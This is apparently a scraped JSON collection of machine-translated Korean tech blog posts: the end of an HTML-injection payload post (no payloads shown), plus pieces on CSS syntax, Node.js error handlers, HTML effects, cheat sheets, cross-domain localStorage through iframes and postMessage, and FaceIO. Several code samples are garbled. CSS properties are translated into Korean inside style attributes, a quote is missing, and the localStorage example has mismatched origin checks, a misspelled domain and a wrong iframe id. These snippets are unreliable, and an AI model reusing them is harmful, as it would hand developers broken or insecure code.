(중략)\n\n여기까지 주입을 시도해보고, 어디에 삽입해야 하는지 알려줘.... 찾아보세요..\n\n다음주 월요일에 만나요,\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n행복한 해킹! 해커들...","ogImage":{"url":"/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png"},"coverImage":"/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png","tag":["Tech"],"readingTime":5},{"title":"CSS 기초 문법 정리","description":"","date":"2024-05-02 00:01","slug":"2024-05-02-IntroductiontoCSSSyntax","content":"\n\n![CSS Syntax](/assets/img/2024-05-02-IntroductiontoCSSSyntax_0.png)\n\nCSS를 사용하는 규칙의 두 부분은 선언 블록과 선택자입니다.\n\n## CSS 구문:\n\n![CSS Syntax](/assets/img/2024-05-02-IntroductiontoCSSSyntax_1.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n선택기는 스타일을 지정하려는 HTML 요소를 가리킵니다.\n\n각 선언은 콜론으로 구분된 CSS 속성 이름과 값으로 구성됩니다.\n\n# 예제:\n\n```js\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n\u003cstyle\u003e\np {\n  color: red;\n  text-align: center;\n} \n\u003c/style\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\n\u003cp\u003eHello World!\u003c/p\u003e\n\u003cp\u003eThese paragraphs are styled with CSS.\u003c/p\u003e\n\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 예시 설명:\n\n- CSS에서 P는 셀렉터입니다 (스타일을 적용할 HTML 요소를 가리킵니다: `p`).\n- Red는 속성(property)의 값인 색상입니다.\n- 속성의 값은 'center'이고, 사용된 속성은 text-align입니다.\n\n![이미지](/assets/img/2024-05-02-IntroductiontoCSSSyntax_2.png)\n\n# 읽어 주셔서 감사합니다!","ogImage":{"url":"/assets/img/2024-05-02-IntroductiontoCSSSyntax_0.png"},"coverImage":"/assets/img/2024-05-02-IntroductiontoCSSSyntax_0.png","tag":["Tech"],"readingTime":1},{"title":"Node.js에서 글로벌 에러 이벤트 핸들러를 활용해 오류 처리를 효율적으로 관리하기","description":"","date":"2024-05-02 00:00","slug":"2024-05-01-StreamliningErrorHandlinginNodejswithGlobalErrorEventHandlers","content":"\n\nNode.js 개발 세계에서는 오류를 세련되게 처리하는 것이 탄력적이고 유지보수가 간편한 애플리케이션을 구축하는 데 중요합니다. Node.js에서 오류를 관리하는 효과적인 방법 중 하나는 전역 오류 이벤트 핸들러를 사용하는 것입니다. 이 블로그 포스트에서는 Node.js 애플리케이션에서 전역 오류 처리를 구현하는 방법을 살펴보겠습니다. 이를 통해 전체 코드 베이스에서 일관된 오류 관리를 보장할 수 있습니다.\n\nNode.js의 오류 이벤트 이해\n\nNode.js는 처리되지 않은 프라미스 rejections, 처리되지 않은 예외, 및 프로세스 경고 등 다양한 유형의 오류가 발생할 때 오류 이벤트를 발생시킵니다. 이러한 이벤트를 청취함으로써 애플리케이션의 어디에서 발생하든간에 일관되게 오류를 포착하고 처리할 수 있습니다.\n\n전역 오류 이벤트 핸들러 구현하기\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nNode.js에서 전역 오류 이벤트 핸들러를 만들려면 process 객체를 사용하여 다음과 같은 오류 이벤트를 수신할 수 있습니다:\n\n- uncaughtException — Node.js 프로세스 내에서 예외가 발생할 때 발생하는 이벤트입니다.\n- unhandledRejection — Node.js 프로세스 내에서 처리되지 않은 프로미스 거부가 발생했을 때 발생하는 이벤트입니다.\n- warning — Node.js 프로세스에서 경고가 발생할 때 발생하는 이벤트입니다.\n\n다음은 이러한 이벤트를 수신하고 오류를 기록하는 전역 오류 이벤트 핸들러의 간단한 예시입니다:\n\n```js\nprocess.on('uncaughtException', (error) =\u003e {\n  console.error('Uncaught Exception:', error);\n  // 옵션: 추가적인 오류 처리 수행, 예를 들어 오류 보고서를 전송하거나 프로세스를 종료합니다.\n});\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nprocess.on('unhandledRejection', (error) =\u003e {\n  console.error('Unhandled Rejection:', error);\n  // 선택 사항: 추가 에러 처리 수행, 예를 들어 에러 보고서 전송 또는 프로세스 종료.\n});\nprocess.on('warning', (warning) =\u003e {\n  console.warn('Warning:', warning);\n  // 선택 사항: 추가 에러 처리 수행, 예를 들어 경고 보고서 전송 또는 경고 로깅.\n});\n```\n\n에러 처리 사용자 정의\n\n전역 에러 이벤트 핸들러를 설정한 후에는 애플리케이션이 에러에 응답하는 방식을 사용자 정의할 수 있습니다. 가능한 조치에는 다음이 포함됩니다:\n\n- Sentry 또는 Rollbar와 같은 외부 에러 모니터링 서비스로 에러 보고 전송.\n- Winston 또는 Bunyan과 같은 전용 로깅 라이브러리를 사용하여 에러 로깅.\n- 메모리 부족과 같은 심각한 에러의 경우 Node.js 프로세스를 안전하게 종료.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n최상의 방법\n\n올바른 오류 처리를 보장하기 위해 다음 최상의 방법을 따릅니다:\n\n- 코드에서 가능한 한 빨리 오류를 처리하여 전역 오류 처리기에 도달하는 것을 방지합니다.\n- 발생한 문제를 디버깅하는 데 도움이 되는 명확하고 설명적인 오류 메시지를 제공합니다.\n- 오류 모니터링 서비스와 로깅 라이브러리를 사용하여 오류를 추적하고 분석하여 문제에 예방적으로 대응하고 응용 프로그램의 안정성을 향상시킵니다.\n\nNode.js 애플리케이션에 전역 오류 이벤트 처리기를 구현함으로써 전체 코드베이스에서 오류를 효과적으로 관리할 수 있습니다. 이 방법을 통해 일관된 오류 처리 방식을 유지하고 오류에 효율적으로 대응하여 더 견고하고 안정적인 응용 프로그램을 구축할 수 있습니다.","ogImage":{"url":"/assets/img/2024-05-01-StreamliningErrorHandlinginNodejswithGlobalErrorEventHandlers_0.png"},"coverImage":"/assets/img/2024-05-01-StreamliningErrorHandlinginNodejswithGlobalErrorEventHandlers_0.png","tag":["Tech"],"readingTime":2},{"title":"웹사이트 만들 때 알아두면 유용한 HTML 효과 8가지","description":"","date":"2024-05-01 23:58","slug":"2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite","content":"\n\nCSS나 PHP를 알지 못해도 멋진 웹사이트를 만들 수 있다면, 이 멋진 HTML 효과 트릭 8가지를 사용하여 멋진 웹사이트를 만들어보세요. 멋진 웹사이트를 구축하고 싶지만 웹 개발에 대한 마스터 스킬이 없다면 걱정하지 마세요! CSS와 PHP를 알 필요가 없다면 이 멋진 HTML 효과 8가지를 선택하세요. 그리고 이 태그들을 HTML에 복사하고 붙이는 방법을 배워보세요.\n\n![8 Cool HTML Effects](/assets/img/2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite_0.png)\n\n일부 멋진 HTML 효과를 시작할 수 있도록 무료 코드 템플릿을 모았습니다. 이들은 돈을 지불하지 않고도 기능성과 사용자 경험을 증가시킵니다. HTML에서 이 멋진 코드들은 대부분 CSS와 PHP를 포함하고 있습니다.\n\n# 웹사이트에 추가할 수 있는 8 가지 멋진 HTML 효과\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 1. 멋진 HTML 패럴랙스 효과\n\n다른 웹사이트에서 온라인 광고로 사용된 패럴랙스 효과를 보셨죠?\n\n이 효과를 즐기고 이 효과를 담은 간단한 패럴랙스 효과 코드를 W3Schools에서 복사해보세요. 이 효과는 HTML, CSS, 그리고 JavaScript가 결합된 것입니다.\n\n## 2. 스크롤 가능한 HTML 댓글 상자 코드\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n가로스크롤 가능한 HTML 코멘트 상자 코드는 텍스트를 간결한 형태로 포장하는 데 도움이 되는 간단하지만 유용한 HTML 요소입니다. 그래서 페이지가 전체 공간을 제공하지 않습니다.\n\n만약 상자의 크기와 색상을 원하는 대로 변경하여 맞추고 싶다면 쉽게 변경할 수 있습니다.\n\n입력:\n\n```js\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n  \u003chead\u003e\n    \u003cmeta charset=\"UTF-8\" /\u003e\n    \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /\u003e\n  \u003c/head\u003e\n  \u003cstyle\u003e\n    main {\n      padding: 20px;\n      display: block;\n      min-height: 100vh;\n      min-width: 100vh;\n    }\n    h2 {\n      text-align: center;\n      color: #004aad;\n    }\n    .comment-section {\n      max-height: 50vh;\n      max-width: 100%;\n      background-color: #004aad;\n      overflow-y: scroll;\n    }\n    .comment {\n      height: 10%;\n      padding: 2%;\n      margin: 2%;\n      background-color: #ffff;\n      color: black;\n    }\n  \u003c/style\u003e\n  \u003cbody\u003e\n    \u003ch2\u003eScrollable HTML Comment Box Code\u003c/h2\u003e\n    \u003cmain\u003e\n      \u003cdiv class=\"comment-section\"\u003e\n        \u003cdiv class=\"comment\"\u003eThis is first comment.\u003c/div\u003e\n        \u003cdiv class=\"comment\"\u003eThis is second comment.\u003c/div\u003e\n        \u003cdiv class=\"comment\"\u003eThis is third comment.\u003c/div\u003e\n        \u003cdiv class=\"comment\"\u003eThis is fourth comment.\u003c/div\u003e\n        \u003cdiv class=\"comment\"\u003eThis is fifth comment.\u003c/div\u003e\n        \u003cdiv class=\"comment\"\u003eThis is sixth comment.\u003c/div\u003e\n      \u003c/div\u003e\n    \u003c/main\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n만약 무언가 좀 더 멋있게 추가하고 싶다면, Quackit에서 커스터마이즈 가능한 코멘트 상자에 대한 코드를 가져올 수도 있어요.\n\n## 3. 멋진 HTML 요령: 강조 효과\n\n`span` 태그를 사용하면 텍스트나 이미지에 여러 가지 멋진 HTML 효과를 줄 수 있어요. 이 모든 작업은 브라우저에서 처리되기 때문에 Google Chrome, Microsoft Edge 및 Mozilla Firefox에서 작업할 수 있어요. 왜냐하면 이 브라우저들은 미리 정의된 HTML 코드를 가지고 있기 때문이에요.\n\n`span` 태그로 둘러싸인 텍스트는 이 HTML 텍스트 효과에 의해 강조되어요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nInput:\n\n```md\n```js\n\u003cspan style=\"background-color: #004aad\u003e highlighted text.\u003c/span\u003e\n```\n\n## 4. 텍스트에 배경 이미지 추가\n\n텍스트의 배경 이미지를 변경할 수 있습니다. 또한 텍스트의 색상도 변경할 수 있습니다. 자신이 원하는 시각으로 추가할 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n입력:\n\n```js\n\u003cspan style=\"배경 이미지: url(https://i0.wp.com/www.learnically.com/wp-content/uploads/2023/05/html-strucher.jpg resize=768%2C432\u0026ssl=1);  글꼴 크기: 20pt; \"\u003eLearnically가 제공하는...\u003c/span\u003e\n```\n\n동일한 효과는 `strong` 태그 내의 텍스트에 스타일 및 글꼴 요소를 추가하여도 동일하게 구현됩니다.\n\n## 5. 제목 툴팁 추가\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n툴팁은 텍스트나 이미지 위로 마우스를 올리면 나타납니다. 웹사이트에서 이미지, 링크된 텍스트 또는 데스크톱 앱의 메뉴 항목에서도 볼 수 있어요. 간단한 HTML을 웹페이지에 추가하여 이 HTML 효과를 사용해보세요.\n\n입력:\n\n```js\n\u003cspan title=\"이것이 툴팁입니다.\"\u003e마우스를 올려보세요!\u003c/span\u003e\n``` \n\n## 6. 텍스트 스크롤 또는 떨어지는 효과\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n구글에서 \"marquee HTML\"을 검색하면 상단에 검색 결과 수가 계속 스크롤되는 슬라이더가 있습니다. 이 효과는 현재 사용되지 않는 marquee 태그로 만들어집니다. 일부 브라우저에서는 이 효과가 제거되었지만 대부분의 브라우저에서는 여전히 지원합니다.\n\n입력:\n\n```js\n\u003cmarquee\u003eI wanna scroll with it\u003c/marquee\u003e\n```\n\n\"left\"를 \"right\"로 변경하여 텍스트를 스크롤하도록 스위치 추가하기.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 7. 메뉴를 HTML로 변경해보세요\n\n이 코드는 동적으로 사용될 때 HTML이 잘 작동합니다. 그러나 이 스크립트 사용 시, 메뉴를 만들어내는 효과가 매우 훌륭해요.\n\n이 코드는 평범한 HTML 태그보다는 복잡해요. 스타일 시트와 스크립트를 통해 작동하기 때문이죠. 간단하게 Dynamic Drive에서 코드를 복사해 `html` head 섹션에 붙여넣으면 됩니다.\n\n## 8. Tableizer로 HTML 스프레드시트 얻기\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n만약 웹 사이트에 스프레드시트를 표시하고 싶다면, Tableizer를 사용해보세요! 데이터를 HTML 테이블로 변환해줍니다. 엑셀, 구글 문서 또는 다른 스프레드시트에서 데이터를 복사하여 tableizer.journalistopia.com의 변환 도구에 붙여넣으세요. 테이블 옵션을 클릭한 후 Tableize It을 클릭하여 HTML 출력을 받아보세요.\n\n이것은 또한 웹사이트의 전체 HTML 코드 중에서 가장 좋은 코드가 될 것입니다. Tableize It!이 모든 어려운 작업을 처리하기 때문이죠.\n\nHTML 코드를 클릭하고 복사하여 웹 사이트에 추가하세요. 필요에 따라 몇 가지 편집 속성을 추가할 수 있습니다.\n\nHTML, CSS 및 JavaScript는 멋진 웹 사이트를 만드는 가장 강력한 옵션입니다. 그러나 단 8가지 멋진 HTML 효과만을 사용하여 기본적이지만 멋진 웹 사이트를 구축할 수도 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 더 멋진 HTML 코드 사이트\n\n- HTML Goodies: 멋진 `span` 태그 아이디어를 제공합니다.\n- Dynamic Drive: 놀라운 동적 HTML 스크립트를 소개합니다.\n- Quackit: 멋진 HTML 코드를 제공합니다.\n\n이 8가지 멋진 HTML 효과들을 연습해보세요. 사용하면 사용할수록 익숙해질 거예요.\n\n이 글은 공식적으로 Learnically에 등재되어 있으며, 해당 사이트도 방문해보세요.","ogImage":{"url":"/assets/img/2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite_0.png"},"coverImage":"/assets/img/2024-05-01-8CoolHTMLEffectstoCreateanAwesomeWebsite_0.png","tag":["Tech"],"readingTime":5},{"title":"프론트엔드 개발자를 위한 필수 치트 8가지","description":"","date":"2024-05-01 23:57","slug":"2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1","content":"\n\n![이미지](/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_0.png)\n\n웹 개발자를 위한 궁극적인 자료인 \"웹 개발자를 위한 필수 치트 시트\"에 오신 것을 환영합니다: 에디션 1!\n\n이 대화식 기사에서는 HTML 및 CSS부터 JavaScript 이상의 필수 치트 시트를 살펴볼 것입니다. 이 치트 시트들은 웹 개발의 복잡성을 쉽게 탐색할 수 있도록 도와줄 것입니다.\n\n자, 이제 들어가서 코딩 실력을 향상시켜 보세요!🤍\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- HTML Cheat Sheet\n\n![HTML Cheat Sheet](/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_1.png)\n\nHTML Cheat Sheet는 HTML 요소, 속성 및 구문에 대한 포괄적인 개요를 제공합니다. \"div\" 및 \"p\"와 같은 기본 태그부터 양식 및 표와 같은 더 고급 개념까지, 이 치트 시트는 HTML을 사용하여 웹 페이지를 구조화하고 형식 지정하는 데 필요한 모든 내용을 다룹니다.\n\n2. CSS Cheat Sheet\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n![CSS Cheat Sheet](/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_2.png)\n\nCSS Cheat Sheet은 CSS 선택자, 속성 및 값에 대한 go-to 참조 자료입니다. 텍스트 스타일링, 요소 위치 지정 또는 반응형 레이아웃 생성 등을 할 때, 이 치트 시트는 명확한 설명과 CSS 규칙 및 기술의 예제로 유용합니다.\n\n3. JavaScript Cheat Sheet\n\n![JavaScript Cheat Sheet](/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_3.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nJavaScript Cheat Sheet은 JavaScript 구문, 데이터 유형, 연산자 및 함수에 대한 편리한 참조 자료입니다. 동적 웹 상호작용을 위한 스크립트를 작성하거나 브라우저에서 데이터를 조작하는 경우, 이 치트 시트는 깔끔하고 효율적인 JavaScript 코드를 작성하고 변수, 반복문 및 조건문과 같은 주요 개념을 이해하는 데 도움이 될 것입니다.\n\n4. Git Cheat Sheet\n\n![](/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_4.png)\n\nGit Cheat Sheet은 소프트웨어 개발 프로젝트에서 버전 관리 및 협업에 필수적입니다. `git add` 및 `git commit`과 같은 기본 Git 명령에서 브랜치 및 병합과 같은 더 고급 워크플로까지, 이 치트 시트는 Git을 사용하여 코드베이스를 효과적으로 관리하는 데 빠른 참조 자료를 제공합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n5. 부트스트랩 치트 시트\n\n![부트스트랩 치트 시트](/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_5.png)\n\n부트스트랩 치트 시트는 부트스트랩 프레임워크에 대한 포괄적인 가이드로, 그리드 시스템, 구성 요소 및 유틸리티를 포함하고 있습니다. 반응형 레이아웃을 구축하거나 UI 요소에 스타일을 적용할 때, 이 치트 시트는 부트스트랩 클래스와 기능을 사용하여 개발 프로세스를 더욱 효율적으로 만들어주는 빠른 참고 자료를 제공합니다.\n\n6. jQuery 치트 시트\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\n![jQuery Cheat Sheet](/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_6.png)\n\njQuery Cheat Sheet은 DOM 조작과 이벤트 처리를 위한 인기 있는 JavaScript 라이브러리에 대한 안내서입니다. 요소 선택 및 CSS 조작, 애니메이션 및 AJAX 요청 처리부터 웹 프로젝트에서 상호작용 및 기능성을 향상하는 데 필요한 jQuery 메소드와 구문을 다룬다.\n\n7. React Cheat Sheet\n\n![React Cheat Sheet](/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_7.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n리액트 치트 시트는 사용자 인터페이스를 구축하는 데 리액트 라이브러리를 사용하는 개발자들에게 유용한 참고 자료입니다. 컴포넌트 생성 및 상태 관리, 이벤트 처리 및 동적 콘텐츠 렌더링까지, 이 치트 시트는 리액트 개념과 패턴에 대한 간략한 개요를 제공하여 강력하고 효율적인 리액트 애플리케이션을 개발하는 데 도움이 됩니다.\n\n8. Node.js 치트 시트\n\n![Node.js Cheat Sheet 이미지](/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_8.png)\n\nNode.js 치트 시트는 Node.js를 사용한 서버 측 JavaScript 개발을 안내해주는 가이드입니다. 서버 설정 및 HTTP 요청 처리, 모듈 및 파일 시스템 작업부터 확장 가능하고 성능이 우수한 웹 애플리케이션을 구축하는 데 필수적인 Node.js API 및 기능을 다루는 치트 시트입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n이 필수 참고 자료들을 손끝으로 사용하면 어떤 웹 개발 프로젝트에도 자신감 있고 효율적으로 대응할 수 있을 거예요.\n\n이 자원들을 반드시 즐겨찾기 해 두세요✅ 그리고 필요할 때마다 빠르게 참고할 수 있도록 다시 돌아오세요.\n\n더 많은 유용한 기사를 탐색하고 싶다면, Medium에서 저를 팔로우해보세요 🔗 아래 댓글 💬을 남겨주시고 함께할 기술 모험 종류를 알려주세요! 의견을 듣고 싶어요.\n\n이 기사를 즐겼다면, 응원의 의미로 👏 박수를 주는 것을 잊지 마세요!","ogImage":{"url":"/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_0.png"},"coverImage":"/assets/img/2024-05-01-8Must-HaveCheatSheetsforWebDevelopersEdition1_0.png","tag":["Tech"],"readingTime":4},{"title":"크로스 도메인에서 로컬스토리지 구현하기","description":"","date":"2024-05-01 23:55","slug":"2024-05-01-Howtoachievecross-domainlocalStorage","content":"\n\n\n![이미지](/assets/img/2024-05-01-Howtoachievecross-domainlocalStorage_0.png)\n\nLocalStorage는 웹에 데이터를 저장하는 한 가지 방법입니다. 이는 클라이언트 컴퓨터 브라우저에 저장됩니다.\n\n데이터는 도메인별로 저장되며, 동일한 도메인을 가진 페이지만이 데이터에 액세스하고 수정할 수 있습니다. 다른 도메인의 페이지는 서로의 데이터에 액세스할 수 없습니다. 이는 브라우저 저장소 보안 문제이며, 사실 도메인 및 서브도메인 간에 LocalStorage/SessionStorage/IndexedDB를 공유할 수 없습니다. 이는 \"동일 출처 정책\"의 일부입니다.\n\n# 왜 localStorage를 공유해야 할까요?\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n내가 겪은 실제 예시 중 하나는 회사에서 개발하지 않은 마케팅 사이트의 데이터에 접근해야 했을 때였어요. 우리 회사에서 개발하지 않은 사이트는 저희 응용 프로그램 사이트와 다른 도메인에 호스팅되어 있었거든요.\n마케팅 사이트가 www.marketing.com 도메인에 있고, 저희 응용 프로그램이 다른 도메인인 www.app-site.com에 있었다고 해봅시다. 사용 사례는 분석 목적을 위해 이 두 사이트 간의 전체 사용자 이동을 저장하는 것이었어요. 사용자는 localStorage에 저장된 사용자 ID를 받았고, 그 여정 중 각 이벤트가 그 ID와 함께 기록되었어요. 저는 도메인 간에 localStorage를 공유할 수 있는 방법이 필요했어요.\n\n# 어떻게 해결할까요?\n\nA 도메인이 www.aaa.com이고 B 도메인이 www.bbb.com일 때, B 도메인이 A 도메인의 localStorage를 읽고 쓸 수 있도록 하고 싶다고 해봅시다.\n\n## 요약\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 도메인 B에 있는 Iframe을 사용하여 도메인 A에서 작은 HTML을로드합니다.\n- 각 도메인(domain B 및 도메인 A의 Iframe)에서 리스너를 설정하고 postMessage를 통해 통신합니다.\n- 도메인 A는 localStorage에서 데이터를 가져와 메시지로 보냅니다.\n\n![이미지](/assets/img/2024-05-01-Howtoachievecross-domainlocalStorage_1.png)\n\n## 다른 localStorage에 쓰기\n\n먼저 도메인 B에 Iframe을 생성하고 도메인 A에서 작은 HTML 파일을로드하도록합니다. Iframe 스타일에는 높이, 너비 및 테두리가 없습니다. 또한 절대 위치에 떠 있습니다. DOM의 자연 흐름에 차지되지 않도록하기 위함입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n// www.bbb.com\n\u003ciframe id=\"iframe\" src=\"www.aaa.com/external.html\" onload=\"onMyFrameLoad()\"  style=\"width:0;height:0;border:none;position:absolute;\"\u003e\u003c/iframe\u003e\n```\n\n그리고 도메인 A에서 호스팅된 작은 HTML 파일을 만들어서 리스너를 설정합니다:\n```js\n// www.aaa.com/external.html\n\u003chtml\u003e\n    \u003chead\u003e\n      \u003cscript\u003e\n          window.addEventListener('message', (message) =\u003e {\n            if (message.origin === 'http://www.bbb.com') {\n              const data = JSON.parse(message.data);\n              const { userId } = data;\n              if (userId){\n                localStorage.setItem('userId', userId);\n              }\n            }\n          });\n      \u003c/script\u003e\n    \u003c/head\u003e\n\u003c/html\u003e\n```\n\n이제 도메인 A는 도메인 B로부터 userId와 같은 데이터가 포함된 메시지를 받을 준비가 되었습니다. 이 데이터를 localStorage에 저장합니다. 이 스크립트는 www.aaa.com 아래에 있음을 기억하세요. Iframe에 포함되어 있더라도 여전히 도메인 A의 localStorage를 사용합니다. 사용자가 도메인 B에서 도메인 A로 이동할 때, 우리는 이미 데이터를 갖고 있을 것입니다. 왜냐하면 도메인 B가 메시지를 보내고 도메인 A가 해당 데이터를 localStorage에 저장했기 때문입니다. 중요한 보안 점검으로 message.origin을 먼저 확인하는 것을 잊지 마세요! 우리는 익숙하지 않은 출처의 메시지에 응답하고 싶지 않습니다.\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n우리는 실제로 도메인 B에서 postMessage를 통해 메시지를 보내야 합니다. 이를 위해 Iframe의 onMyFrameLoad 함수 코드를 추가합니다:\n\n```js\n// www.bbb.com\n\u003cscript\u003e\n  function onMyFrameLoad() {\n    var userId = getUserId();\n    var data = {userId: userId};\n    var iframeEl = document.getElementById(\"myIframe\");\n    iframeEl.contentWindow.postMessage(JSON.stringify(data), 'www.aaa.com');\n  };\n\u003c/script\u003e\n\n\u003ciframe id=\"iframe\" src=\"www.aaa.com/external.html\" onload=\"onMyFrameLoad()\"  style=\"width:0;height:0;border:none;position:absolute;\"\u003e\u003c/iframe\u003e\n```\n\nIframe가로드 된 후에 onMyFrameLoad 함수가 실행되어야 하는 것이 중요합니다. 즉, onload에서 호출해야 합니다. 메시지를 보내기 전에 다른 쪽에서 이벤트 리스너를 추가해야 합니다.\n\n그래서 모든 것을 설정했습니다. 사용자가 도메인 B에 도달하면 Iframe이 로드되고, 그런 다음 도메인 A의 external.html이 호출되어 메시지를 위한 리스너를 설정합니다. 도메인 B는 이후 userId를 도메인 A로 전송할 postMessage를 실행한 후, 그것이 localStorage에 저장될 것입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 반대 방향\n\n이제 사용자가 처음에 도메인 A를 방문한 경우를 고려해 봅시다. 우리는 도메인 A의 로컬 저장소에 저장된 사용자 ID와 같은 데이터를 도메인 B와 공유하고 싶습니다.\n\n이를 위해 외부.html에 이 데이터가 이미 있는지 확인하는 if 문을 추가해야 합니다. 데이터가 있는 경우, 도메인 B에게 postMessage를 보냅니다. 그렇지 않으면, 도메인 B가 데이터를 보내기를 대기합니다.\n\n```js\n// www.aaa.com/external.html\n\u003chtml\u003e\n    \u003chead\u003e\n      \u003cscript\u003e\n            const userId = localStorage.getItem('userId');\n            if (userId) {\n              const data = {userId: userId};\n              parent.postMessage(JSON.stringify(data), \"http://www.bbb.com\")\n            }\n            else {\n              window.addEventListener('message', (message) =\u003e {\n                if (message.origin === 'http://www.marketing.com') {\n                  const data = JSON.parse(message.data);\n                  const { userId } = data;\n                  if (userId){\n                    localStorage.setItem('userId', userId);\n                  }\n                }\n              });       \n            }  \n      \u003c/script\u003e\n    \u003c/head\u003e\n\u003c/html\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n알림: 이제 postMessage는 iframe 요소가 아니라 부모의 속성입니다. 이는 iframe이 포함되어 있을 때 해당 window이 로드를 담당하는 부모 객체이기 때문입니다.\n\n그리고 도메인 A와 유사하게, 도메인 B에서 듣는 리스너를 추가할 것입니다.\n\n```js\n// www.bbb.com\n\u003cscript\u003e \n    window.addEventListener('message', function(message) {\n    if (message.origin === 'wwww.aaa.com') {\n      var data = JSON.parse(message.data);\n      var userId = data.userId;\n      if (userId){\n        doSomethingWithTheData()\n      }\n    }\n  });\n\u003c/script\u003e\n\n\u003cscript\u003e\n  function onMyFrameLoad() {\n    var userId = getUserId();\n    var data = {userId: userId};\n    var iframeEl = document.getElementById(\"myIframe\");\n    iframeEl.contentWindow.postMessage(JSON.stringify(data), 'www.aaa.com');\n  };\n\u003c/script\u003e\n\n\u003ciframe id=\"myIframe\" src=\"www.aaa.com/external.html\" onload=\"onMyFrameLoad()\"  style=\"width:0;height:0;border:none;position:absolute;\"\u003e\u003c/iframe\u003e\n```\n\n# 결론\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n우리는 localStorage에 저장된 데이터를 다른 도메인과 iframe을 사용하여 postMessage를 통해 공유할 수 있다는 것을 알았어요.\n\n이것은 물론 2개의 도메인 간에 정확히 공유하려는 매개변수에 대한 합의가 있는 구체적인 사용 사례에 적합합니다. 우리는 거의 없지만 교차 도메인 스토리지 규칙을 어길 용의가 있는 몇 가지 사용 사례가 있으므로, 당신의 경우가 적합한 사용 사례인지 신중히 생각해야 해요.","ogImage":{"url":"/assets/img/2024-05-01-Howtoachievecross-domainlocalStorage_0.png"},"coverImage":"/assets/img/2024-05-01-Howtoachievecross-domainlocalStorage_0.png","tag":["Tech"],"readingTime":6},{"title":"HTMX와 Express.JS를 이용해 얼굴 인식 기능 추가하기","description":"","date":"2024-05-01 23:54","slug":"2024-05-01-IntegratingFaceIOusingHTMXandExpressJS","content":"\n\n요즘 빠르게 발전하는 디지털 시대에는 보안과 사용자 경험이 중요한 고려 사항이며, 견고한 인증 솔루션을 찾는 노력이 더 커지고 있습니다. 암호와 같은 전통적인 방법은 더 많은 위협에 노출되고 사용자 불만을 증가시키므로 대체 메커니즘에 대한 탐구가 증가하고 있습니다. 얼굴 인증은 보안과 사용자 경험을 결합한 유망한 솔루션이 되어 나타났습니다.\n\n이 기사는 얼굴인식을 웹 애플리케이션에 쉽게 통합할 수 있는 FACEIO와 HTMX, Express.js의 융합을 탐구합니다. HTMX의 동적 기능과 Express.js의 견고함을 활용하여 이 통합은 웹 인증을 혁신하고 안전하고 사용자 친화적인 경험을 제공할 것으로 약속합니다. 실용적인 예제와 통찰을 통해, 이 융합이 개발자들에게 보안 및 사용자 만족도를 향상시키는 정교한 인증 시스템을 만들 수 있는 능력을 부여하는 방법을 